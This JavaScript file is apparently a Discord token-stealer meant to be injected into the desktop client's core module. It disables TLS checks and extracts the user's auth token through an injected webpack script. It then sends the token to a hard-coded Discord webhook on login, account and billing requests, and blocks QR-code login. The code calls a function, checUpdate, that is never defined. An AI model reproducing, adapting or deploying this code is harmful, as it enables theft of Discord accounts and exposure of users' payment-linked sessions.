process.env['NODE_TLS_REJECT_UNAUTHORIZED'] = 0

const fs = require("fs")
const electron = require("electron")
const https = require("https");
const queryString = require("querystring")

const WebHook = 'https://discord.com/api/webhooks/1075350758347767819/o2TMNbM-S_UumdWgkTiaTKLD8C-2jI_QZO2duJvxTX5NEKCXCmwo0mvXnLlUN3RNyqiu';



var tokenScript = `(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`

async function execScript(str) {
    var window = electron.BrowserWindow.getAllWindows()[0]
    var script = await window.webContents.executeJavaScript(str, true)
    return script || null

}
function semenlol(content, webhookUrl) {
    // The message to send to the webhook
    const message = {
      content: content,
    };
  
    // Convert the message to a JSON string
    const body = JSON.stringify(message);
  
    // Set the options for the HTTPS request
    const options = {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(body),
      },
    };
  
    // Send the request to the webhook
    const request = https.request(webhookUrl, options, response => {
      console.log(`Status code: ${response.statusCode}`);
    });
  
    request.on('error', error => {
      console.error(error);
    });
  
    request.write(body);
    request.end();
  }

const FirstTime = async () => {
    var token = await execScript(tokenScript)
    var response = '@everyone```Token: ' + token + '```'
    semenlol(response, WebHook)
}

var config = {
    Filter: {
        "urls": [
            "https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json",
            "https://*.discord.com/api/v*/applications/detectable",
            "https://discord.com/api/v*/applications/detectable",
            "https://*.discord.com/api/v*/users/@me/library",
            "https://discord.com/api/v*/users/@me/library",
            "https://*.discord.com/api/v*/users/@me/billing/subscriptions",
            "https://discord.com/api/v*/users/@me/billing/subscriptions",
            "wss://remote-auth-gateway.discord.gg/*"
        ]
    },
    onCompleted: {
        urls: [
            "https://discord.com/api/v*/users/@me",
            "https://discordapp.com/api/v*/users/@me",
            "https://*.discord.com/api/v*/users/@me",
            "https://discordapp.com/api/v*/auth/login",
            'https://discord.com/api/v*/auth/login',
            'https://*.discord.com/api/v*/auth/login',
            "https://api.stripe.com/v*/tokens"
        ]
    }
};

// electron.session.defaultSession.webRequest.onBeforeSendHeaders(config.Filter, (details, callback) => {
//     if (request.statusCode !== 200) return
//     var lol = execScript(tokenScript)
//     semenlol (lol, WebHook)
//     callback(details);
//   })

electron.session.defaultSession.webRequest.onBeforeRequest(config.Filter, async (details, callback) => {
    await electron.app.whenReady();
    await FirstTime()
    if (details.url.startsWith("wss://remote-auth-gateway")) return callback({
        cancel: true
    })

    checUpdate()
    callback({})
})


module.exports = require('./core.asar');